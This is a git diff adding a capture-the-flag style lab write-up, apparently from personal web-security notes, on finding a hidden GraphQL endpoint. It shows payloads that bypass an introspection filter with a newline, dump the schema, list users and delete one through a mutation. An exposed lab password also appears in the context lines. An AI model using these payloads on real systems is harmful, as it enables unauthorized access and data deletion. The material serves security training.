@@ -1230,6 +1230,52 @@ Stay sneaky 😎
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ----
 ----
 
@@ -1414,7 +1460,158 @@ administrator : lnqajgkwlru628r4sgjc
 
 
 
+<details>
+  <summary>Lab: Finding a hidden GraphQL endpoint</summary>
 
+
+###>  The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.
+
+> To solve the lab, find the hidden endpoint and delete ``carlos``. 
+
+----
+
+
+first test common ``graphql`` endpoints
+
+<img width="557" height="460" alt="image" src="https://github.com/user-attachments/assets/3172e313-20bc-4226-9b04-920f1893b50a" />
+
+all responses ``404`` except one ``405`` but say ``method not allowed``
+
+<img width="954" height="241" alt="image" src="https://github.com/user-attachments/assets/3faecc2c-88fb-4074-926b-c76228eed772" />
+
+it seem that it allow **``GET``** method
+
+<img width="919" height="572" alt="image" src="https://github.com/user-attachments/assets/8a3a78bc-2a86-437e-a9c5-af9d7c275a0f" />
+
+now **``qurey not present``**
+
+<img width="1534" height="447" alt="image" src="https://github.com/user-attachments/assets/d77a13d6-bb67-4ee9-8539-4d1d96de0408" />
+
+first put this header in request 
+
+```http
+Content-Type: application/json;
+```
+
+and try to add simple qurey to see what will be the result
+
+```json
+{
+  "query": "query{__typename}"
+}
+```
+
+and booom 
+
+<img width="1534" height="441" alt="image" src="https://github.com/user-attachments/assets/ee8a6f2c-bc06-4909-99aa-cf48313978ef" />
+
+now try to write introspction simple query :
+
+```json
+{
+  "query": "{__schema{queryType{name}}}"
+}
+```
+
+response say ``introspection not allowed`` it seems there is filteration on it 
+
+<img width="1542" height="449" alt="image" src="https://github.com/user-attachments/assets/9c22e8d9-09b0-4ac3-9ce2-6471385de770" />
+
+try to pypass it by using **``\n``**:
+
+```json
+{
+  "query": "{__schema\n{queryType{name}}}"
+}
+
+                      |
+```
+and it work 🔥
+
+<img width="1317" height="438" alt="image" src="https://github.com/user-attachments/assets/1dfa68f6-e45c-4d8e-8671-8b69a4dee4e9" />
+
+
+now use full ``introspection`` qurey 
+
+```json
+{
+  "query": " query IntrospectionQuery { __schema\n { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
+}
+
+```
+
+<img width="1549" height="705" alt="image" src="https://github.com/user-attachments/assets/e453946c-1581-408f-9545-f8e30d78be1e" />
+
+ ### > use [Introspection Visualization](http://nathanrandal.com/graphql-visualizer/)
+
+<img width="1874" height="580" alt="image" src="https://github.com/user-attachments/assets/02b0bd11-6c73-450d-8307-f4c6419c645c" />
+
+now get users
+
+```json
+{
+  "query": "{ getUser(id: 1) { id username }}"
+}
+```
+
+<img width="1402" height="472" alt="image" src="https://github.com/user-attachments/assets/eb842d5b-c4fe-41d7-bd12-fbb7a525e6ea" />
+
+```
+id   user
+1     adminstrator
+2     wiener
+3     carlos
+```
+
+in ``schema`` foud this ``DeleteOrganizationUserInput``
+
+<img width="771" height="603" alt="image" src="https://github.com/user-attachments/assets/ce921faf-ca9f-48b8-9711-e13caa58d0a1" />
+
+download **`inql`** extension to burp and take the json respose of **``introspection``** to it to see the ``mutaion`` 
+
+<img width="1264" height="447" alt="image" src="https://github.com/user-attachments/assets/74c533cd-2e73-462b-8834-cad3cba39347" />
+
+or use this simple query :
+
+```json
+{
+  "query": "{ __schema\n { mutationType { name fields { name args { name type { name kind } } } } }}"
+}
+```
+
+<img width="1441" height="467" alt="image" src="https://github.com/user-attachments/assets/d1eee12e-d58d-4b96-b6a9-3458cabccbbd" />
+
+
+good now we know that there is **``mutaion``** call **``DeleteOrganizationUserInput``** 
+
+### > Discover the fields inside ``DeleteOrganizationUserInput``
+
+```json
+{
+  "query": "{ __type(name: \"DeleteOrganizationUserInput\")\n { name kind inputFields { name type { name kind ofType { name kind } } } }}"
+}
+```
+
+``output``
+
+<img width="1532" height="519" alt="image" src="https://github.com/user-attachments/assets/049c1775-e902-48d6-9e24-17d9dd7c968a" />
+
+
+so it require the **``id``**
+
+```json
+{
+  "query": "mutation { deleteOrganizationUser(input: { id: 3 }) { __typename }}"
+}
+```
+
+<img width="1226" height="399" alt="image" src="https://github.com/user-attachments/assets/555e0324-a75a-4979-a877-078504f1bfa8" />
+
+
+
+
+  
+</details>
 
 
 
